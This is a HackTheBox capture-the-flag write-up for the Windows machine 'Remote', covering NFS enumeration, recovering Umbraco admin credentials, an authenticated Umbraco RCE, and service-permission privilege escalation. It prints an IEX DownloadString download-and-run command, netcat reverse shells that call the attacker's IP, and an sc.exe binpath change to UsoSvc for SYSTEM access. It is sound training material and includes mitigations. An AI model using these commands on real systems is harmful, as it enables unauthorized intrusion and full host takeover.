# Remote

![](images/info.PNG)

__Task__: Find [user.txt](#user-flag) and [root.txt](#root-flag)

### Penetration Methodologies

__Scanning__

- nmap

__Enumeration__

- Webpage enumeration

- Public NFS drives

__Exploitation__

- Authenticated RCE on CMS

__Priv Esc__

- Weak Service Configuration

***

This writeup is for the HackTheBox Windows machine _Remote_.

## User Flag

First step we'll do is use `nmap` to scan _Remote_.

- __sC__: Enable common scripts

- __sV__: version and service on the port

- __O__: remote OS detection using fingerprinting

```
# Nmap 7.80 scan initiated Wed Jul  1 21:07:29 2020 as: nmap -sC -sV -O -oA scan180 10.10.10.180
Nmap scan report for 10.10.10.180
Host is up (0.081s latency).
Not shown: 993 closed ports
PORT     STATE SERVICE       VERSION
21/tcp   open  ftp           Microsoft ftpd
|_ftp-anon: Anonymous FTP login allowed (FTP code 230)
| ftp-syst:
|_  SYST: Windows_NT
80/tcp   open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Home - Acme Widgets
111/tcp  open  rpcbind       2-4 (RPC #100000)
| rpcinfo:
|   program version    port/proto  service
|   100000  2,3,4        111/tcp   rpcbind
|   100000  2,3,4        111/tcp6  rpcbind
|   100000  2,3,4        111/udp   rpcbind
|   100000  2,3,4        111/udp6  rpcbind
|   100003  2,3         2049/udp   nfs
|   100003  2,3         2049/udp6  nfs
|   100003  2,3,4       2049/tcp   nfs
|   100003  2,3,4       2049/tcp6  nfs
|   100005  1,2,3       2049/tcp   mountd
|   100005  1,2,3       2049/tcp6  mountd
|   100005  1,2,3       2049/udp   mountd
|   100005  1,2,3       2049/udp6  mountd
|   100021  1,2,3,4     2049/tcp   nlockmgr
|   100021  1,2,3,4     2049/tcp6  nlockmgr
|   100021  1,2,3,4     2049/udp   nlockmgr
|   100021  1,2,3,4     2049/udp6  nlockmgr
|   100024  1           2049/tcp   status
|   100024  1           2049/tcp6  status
|   100024  1           2049/udp   status
|_  100024  1           2049/udp6  status
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
445/tcp  open  microsoft-ds?
2049/tcp open  mountd        1-3 (RPC #100005)
No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
TCP/IP fingerprint:
OS:SCAN(V=7.80%E=4%D=7/1%OT=21%CT=1%CU=35998%PV=Y%DS=2%DC=I%G=Y%TM=5EFD41DC
OS:%P=x86_64-pc-linux-gnu)SEQ(SP=FF%GCD=1%ISR=109%CI=I%II=I%TS=U)SEQ(SP=FF%
OS:GCD=1%ISR=109%TI=I%CI=I%II=I%SS=S%TS=U)OPS(O1=M54DNW8NNS%O2=M54DNW8NNS%O
OS:3=M54DNW8%O4=M54DNW8NNS%O5=M54DNW8NNS%O6=M54DNNS)WIN(W1=FFFF%W2=FFFF%W3=
OS:FFFF%W4=FFFF%W5=FFFF%W6=FF70)ECN(R=Y%DF=Y%T=80%W=FFFF%O=M54DNW8NNS%CC=Y%
OS:Q=)T1(R=Y%DF=Y%T=80%S=O%A=S+%F=AS%RD=0%Q=)T2(R=Y%DF=Y%T=80%W=0%S=Z%A=S%F
OS:=AR%O=%RD=0%Q=)T3(R=Y%DF=Y%T=80%W=0%S=Z%A=O%F=AR%O=%RD=0%Q=)T4(R=Y%DF=Y%
OS:T=80%W=0%S=A%A=O%F=R%O=%RD=0%Q=)T5(R=Y%DF=Y%T=80%W=0%S=Z%A=S+%F=AR%O=%RD
OS:=0%Q=)T6(R=Y%DF=Y%T=80%W=0%S=A%A=O%F=R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=80%W=0%S
OS:=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y%DF=N%T=80%IPL=164%UN=0%RIPL=G%RID=G%RIPCK
OS:=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=80%CD=Z)

Network Distance: 2 hops
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: 4m20s
| smb2-security-mode:
|   2.02:
|_    Message signing enabled but not required
| smb2-time:
|   date: 2020-07-02T02:12:59
|_  start_date: N/A

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Wed Jul  1 21:09:32 2020 -- 1 IP address (1 host up) scanned in 123.75 seconds
```

Our results indicate a lot of services are available to enumerate. First thing, it looks like port 21, FTP, is open and anonymous login is available. Enumerating FTP, however, yields nothing of value.

Additionally, our scan shows that port 80 is open as well, which means we have a webpage to enumerate. While we do that, let's run a full port scan to cover our bases.

```
$ sudo nmap -sC -sV -O -p- -oA full180 10.10.10.180
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
```

The only useful information from the full scan is that port 5985 is open, indicating that `WinRM 2.0 (Microsoft Windows Remote Management)` is available. If we find some credentials, we may be able to gain a foothold or escalate privileges utilizing this service.

Moving on, let's navigate to the webpage.

![](images/umbraco.png)

Looking around, there seems to be a lot of reference to "Umbraco". A quick google search reveals that [Umbraco](https://umbraco.com/) is a Content Management System (CMS). The admin page can also be found at `http://TheWebsite/Umbraco/`. Let's check it out.

![](images/umbraco-login.png)

Any attempt to exploit the login doesn't yield much, and their doesn't appear to be any unauthenticated vulnerabilities and enumerating the site further is unsuccessful, so let's continue to enumerate ports.

One port that stands out is port 2049, indicating NFS drives that may be mountable. If we have access, this may yield some more information. The command `showmount` should give us further details.

```
$ sudo showmount -e 10.10.10.180
Export list for 10.10.10.180:
/site_backups (everyone)
```

Looks like the drive `/site_backups` is visible and it also looks like it's available to everyone. Poor configuration choice. Let's go ahead and mount it, and see what we can find.

```
$ mkdir /tmp/mount
$ sudo mount -t nfs 10.10.10.180:/site_backups /tmp/mount
```

Searching through the directory, we see an interesting file `Umbraco.sdf` within the `App_Data` subdirectory. The extension indicates that this may be a database file. With any luck, we may find be able to see some credentials. Let's use the `strings` command to view it's contents.

```
$ cd /tmp/mount
$ cd App_Data
$ strings Umbraco.sdf | less
```

Within, the file we find has some interesting information.

![](images/admin-string.png)

It looks like we've found a login for the Umbraco CMS, `admin@htb.local`, along with a hashed password. Using an online decoder, we determine the SHA-1 password is `baconandcheese`.

Let's head back to the Umbraco login page at `http://10.10.10.180/umbraco` and try our newly acquired credentials.

After successfully logging in, we can now view the version number for Umbraco.

![](images/umbraco-version.png)

 From earlier, we remember the unauthenticated vulnerabilities for this CMS were limited but there was an [authenticated RCE](https://www.exploit-db.com/exploits/46153) for administrators. The affected version is 7.12.4, the version we currently have admin access to.

Let's modify the configuration on the proof of concept code and specify the command we'd like to execute, our credentials, and the target host URL.

```
command = "ipconfig"
login = "admin@htb.local";
password="baconandcheese";
host = "http://10.10.10.180";
```

Let's also remove the bit of code regarding the cookie data and modify the attack portion to return the results of our command. The addition of this section of code should get us what we need:

```
soup = BeautifulSoup(r4.text, 'html.parser')
output = soup.find(id="result").getText()
print(output)
```  

We'll test our newly weaponized code with an `ipconfig` command.

![](images/rce.png)

Success. Our next step will be using this exploit to gain a foothold. We'll grab a [mini-reverse Powershell script](https://gist.github.com/staaldraad/204928a6004e89553a8d3db0ce527fd5) and host it on web server that we will use to upload files from. We'll also host the Netcat executable, which we can use to upgrade our dumb shell. We'll modify our files with our IP address and port before getting them on the machine.

```
$ mkdir http && cd http
$ sudo python -m SimpleHTTPServer 80
```

Let's start a Netcat listener in preparation as well.

```
$ nc -lvnp 4444
```
Within our exploit python file, we will change our command to the following, which will download and execute our reverse shell script.

```
command = "IEX (New-Object System.Net.Webclient).DownloadString('http://10.10.15.50/mini-reverse.ps1')"
```

After running the RCE exploit, we can see that the box connects successfully to our HTTP server and our Netcat listener successfully connects. Let's not try to use Netcat upgrade our shell. We'll start another listener for this new session.

```
$ nc -lvnp 4445
```

We'll use our python exploit to quickly grab the `nc.exe` file as well.

```
command = "wget 'http://10.10.14.85/nc.exe' -outfile '/Users/Public/Documents/nc.exe'"
```

Within the dumb shell that we have from earlier, we'll run the following command, using Netcat to open a better shell.

```
> C:\Users\Public\Documents\nc.exe 10.10.15.50 4445 -e powershell.exe
```

Now, let's grab the user flag from the public user directory.

![](images/user-flag.png)

## Root Flag

Now, onto root. Let's get the [PowerUp script](https://github.com/PowerShellMafia/PowerSploit/blob/master/Privesc/PowerUp.ps1) from PowerSploit onto the box. This will allow us to enumerate any avenues to escalate our privileges.

First, we'll place the script into our web server directory and use our Powershell session to download it. Let's place it into `C:\Users\Public\Documents\` directory.

```
> invoke-webrequest -Uri http://10.10.15.50/PowerUp.ps1 -OutFile PowerUp.ps1
> Import-Module C:\Users\Public\Documents\powerup.ps1
```

Now that the script is downloaded and we've imported the module, let's run the `Invoke-AllChecks` command.

```
> Invoke-AllChecks

[...]

[*] Checking service permissions...


ServiceName   : UsoSvc
Path          : C:\Windows\system32\svchost.exe -k netsvcs -p
StartName     : LocalSystem
AbuseFunction : Invoke-ServiceAbuse -Name 'UsoSvc'
CanRestart    : True

[...]
```

Looks like we have a service that we can abuse. The Update Orchestrator or UsoSvc can be abused by allowing our current user to manipulate the service path so that when the service is stopped and started, it'll execute a command as system. [This article](https://www.ired.team/offensive-security/privilege-escalation/weak-service-permissions) by Read Team Experiments gives a bit more detail.

The PowerUp script suggests a command in its results, `Invoke-ServiceAbuse`, but this didn't work consistently enough, so let's do it manually.

First, we'll listen on a new port for a reverse shell.

```
$ nc -lvnp 4446
```

Next, let's use `sc.exe` to configure the binpath of the UsoSvc service. We'll change it to a command that will run our Netcat executable to open reverse Powershell session at the port we specified.

```
> sc.exe config UsoSvc binpath="C:\Users\Public\Documents\nc.exe 10.10.15.50 4446 -e powershell.exe"
```

Now, let's stop and start the service.

```
> sc.exe stop usosvc
> sc.exe start usosvc
```

Back on our machine, our listener should connect, with a system shell. Let's grab the root flag!

![](images/root-flag.png)

***

### Mitigation

- Generally, unless it's needed for operational purposes, having a CMS publicly facing is dangerous, and extra security precautions should be taken into consideration. Additionally and along the same lines, mountable NFS drives should not be facing the public, especially if they are open to everyone. This is a terrible configuration and there isn't really a reason that these two things should exist concurrently.

- Keep software updated, especially a CMS that is public facing.

- Check service configurations and understand the risks involved with keeping weak configurations. Using tools that can automate these checks will ease the burden on an administrator.

### Final Thoughts

This box was enjoyable. I appreciated learning a bit more about how to utilize Powershell and command prompt to download files off of our attacking machine with a web server. Other than that, the box was relatively straightforward, although the service abuse required a bit of research to get working but I learned a lot about this process. Additionally, there is an alternate way to escalate privileges with Teamviewer to administrator that I do not cover here, but I may add it in the future.
